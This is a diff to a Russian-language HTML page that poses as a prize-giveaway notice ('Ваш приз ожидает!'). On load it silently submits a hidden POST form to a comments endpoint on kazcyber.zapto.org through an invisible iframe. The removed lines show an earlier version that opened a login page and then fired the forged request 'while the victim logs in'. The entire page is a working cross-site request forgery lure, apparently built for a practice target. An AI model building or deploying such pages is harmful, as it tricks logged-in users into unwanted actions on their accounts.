@@ -2,50 +2,34 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Подтвердите участие</title>
-  <style>
-    body { font-family: sans-serif; text-align: center; background: #f4f4f4; padding: 50px; }
-    button {
-      background-color: #27ae60;
-      color: white;
-      padding: 12px 24px;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-  </style>
+  <title>Ваш приз ожидает!</title>
   <script>
-    function proceed() {
-      // Открыть login.php для ввода капчи
-      const win = window.open("https://kazcyber.zapto.org/login.php", "_blank");
-
-      // Ждём 10 секунд (пока жертва логинится), потом делаем CSRF
+    window.onload = function () {
+      // Ждем пару секунд, потом отправляем POST-запрос
       setTimeout(() => {
         const form = document.createElement("form");
         form.action = "https://kazcyber.zapto.org/comments.php";
         form.method = "POST";
-        form.target = "invisible";
-        
+        form.target = "hiddenFrame";
+
         const input = document.createElement("input");
         input.type = "hidden";
         input.name = "comment";
         input.value = "Спасибо за приз!";
-        form.appendChild(input);
 
+        form.appendChild(input);
         document.body.appendChild(form);
         form.submit();
-      }, 10000);
-    }
+      }, 3000); // 3 секунды после загрузки страницы
+    };
   </script>
 </head>
 <body>
-  <h1>🎉 Подтвердите участие в розыгрыше</h1>
-  <p>Чтобы получить приз, подтвердите, что вы не робот</p>
-  <button onclick="proceed()">Получить приз</button>
-  <iframe name="invisible" style="display:none;"></iframe>
+  <h1>🎉 Поздравляем!</h1>
+  <p>Ваш приз уже почти у вас! Пожалуйста, не закрывайте страницу...</p>
+
+  <iframe name="hiddenFrame" style="display: none;"></iframe>
 </body>
 </html>
-
 
 
